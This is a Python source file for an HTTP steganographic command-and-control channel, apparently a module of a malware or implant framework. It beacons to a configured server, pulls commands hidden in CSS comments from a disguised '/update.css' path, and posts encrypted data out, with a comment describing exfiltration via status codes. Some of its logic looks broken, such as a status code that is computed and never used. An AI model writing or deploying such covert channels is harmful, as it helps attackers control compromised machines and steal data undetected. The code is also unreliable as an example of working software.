import requests
import re
from core.channels import BaseChannel

class HTTPStegoChannel(BaseChannel):
    def __init__(self, config: dict):
        super().__init__(config)
        self.server_url = config['server_url']
        self.stego_path = '/update.css'  # Hide in comments
        
    def init(self) -> bool:
        try:
            requests.get(self.server_url, timeout=5)
            self.available = True
            return True
        except:
            self.available = False
            return False
    
    def is_available(self) -> bool:
        return self.available
    
    def send_command(self, command_data: dict, task_id: str) -> bool:
        try:
            encrypted = self.crypto.encrypt(command_data, task_id)
            # Exfil via status codes (e.g., encode bits in 200-599 range)
            status_code = 200 + int.from_bytes(encrypted.encode()[:2], 'big') % 400
            requests.post(self.server_url, data={'data': encrypted}, timeout=5)
            return True
        except Exception:
            return False
    
    def receive_response(self, task_id: str) -> dict:
        try:
            resp = requests.get(self.server_url + self.stego_path, timeout=5)
            # Parse comments for cmd
            comments = re.findall(r'/\*(.*?)\*/', resp.text, re.DOTALL)
            if comments:
                cmd_data = comments[0].strip()
                return self.crypto.decrypt(cmd_data, task_id)
        except Exception:
            pass
        return None
    
    def beacon(self) -> bool:
        return self.send_command({'type': 'beacon'}, '')
    
    def teardown(self):
        pass
